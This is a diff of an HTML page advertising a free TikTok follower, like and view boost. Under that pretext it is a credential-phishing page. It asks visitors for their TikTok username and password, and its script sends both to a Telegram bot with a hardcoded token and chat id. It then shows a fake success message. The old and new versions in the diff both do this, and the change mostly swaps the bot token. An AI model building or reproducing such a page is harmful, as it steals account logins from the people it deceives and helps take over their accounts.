@@ -1,87 +1,100 @@
-
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <title>فري فولو - رشق تيك توك</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(to bottom, #111, #222);
-            color: white;
-            text-align: center;
-            padding: 30px;
-        }
-        .container {
-            max-width: 400px;
-            margin: auto;
-            background: #1e1e1e;
-            padding: 20px;
-            border-radius: 20px;
-            box-shadow: 0 0 10px #000;
-        }
-        input, select, button {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: none;
-            border-radius: 10px;
-        }
-        button {
-            background: #ff0050;
-            color: white;
-            font-size: 18px;
-            cursor: pointer;
-        }
-        button:hover {
-            background: #e60045;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free Follow</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #000;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: white;
+    }
+
+    .container {
+      background-color: #111;
+      padding: 25px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+      width: 90%;
+      max-width: 400px;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #ff4444;
+    }
+
+    input, select, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      background-color: #222;
+      color: white;
+    }
+
+    button {
+      background-color: #ff0033;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #ff3366;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h2>🔥 فري فولو - رشق تيك توك مجانا</h2>
-        <input type="text" id="username" placeholder="اسم مستخدم تيك توك">
-        <input type="password" id="password" placeholder="كلمة المرور (تأكد من صحتها)">
-        <select id="amount">
-            <option value="1000">1000 متابع</option>
-            <option value="2000">2000 متابع</option>
-            <option value="5000">5000 متابع</option>
-        </select>
-        <select id="type">
-            <option value="متابعين">متابعين</option>
-            <option value="لايكات">لايكات</option>
-            <option value="مشاهدات">مشاهدات</option>
-        </select>
-        <button onclick="sendData()">ابدأ الرشق الآن</button>
-    </div>
+  <div class="container">
+    <h2>🔥 Free Follow - TikTok Boost</h2>
+    <input type="text" id="username" placeholder="اسم مستخدم تيك توك" required>
+    <input type="password" id="password" placeholder="كلمة المرور (تأكد من صحتها)" required>
+    <select id="amount" required>
+      <option value="">-- اختر عدد المتابعين --</option>
+      <option value="1000">1000</option>
+      <option value="2000">2000</option>
+      <option value="5000">5000</option>
+    </select>
+    <select id="type" required>
+      <option value="">-- اختر النوع --</option>
+      <option value="متابعين">متابعين</option>
+      <option value="لايكات">لايكات</option>
+      <option value="مشاهدات">مشاهدات</option>
+    </select>
+    <button onclick="sendData()">ابدأ الرشق الآن</button>
+  </div>
 
-    <script>
-        function sendData() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const amount = document.getElementById('amount').value;
-            const type = document.getElementById('type').value;
+  <script>
+    async function sendData() {
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const amount = document.getElementById('amount').value;
+      const type = document.getElementById('type').value;
+      if (!username || !password || !amount || !type) {
+        alert('يرجى ملء جميع الحقول!');
+        return;
+      }
 
-            const message = `👤 تيك توك جديد:
-يوزر: ${username}
-كلمة السر: ${password}
-الرشق: ${type}
-العدد: ${amount}`;
-            const token = "7197079453:AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk";
-            const chat_id = "7197079453";
+      const message = `🧨 تيك توك جديد:\n👤 المستخدم: ${username}\n🔐 كلمة السر: ${password}\n📦 الكمية: ${amount}\n📌 النوع: ${type}`;
 
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: chat_id,
-                    text: message
-                })
-            }).then(() => {
-                alert("✅ تم إرسال الطلب بنجاح! سيتم الرشق خلال دقائق.");
-            });
-        }
-    </script>
+      await fetch('https://api.telegram.org/bot7522052271:AAHa6XIscaA7ivTn_C0Wr8oaqritL0GP8EY/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: '6454073193', text: message })
+      });
+
+      alert('تمت الإرسال بنجاح!');
+    }
+  </script>
 </body>
 </html>
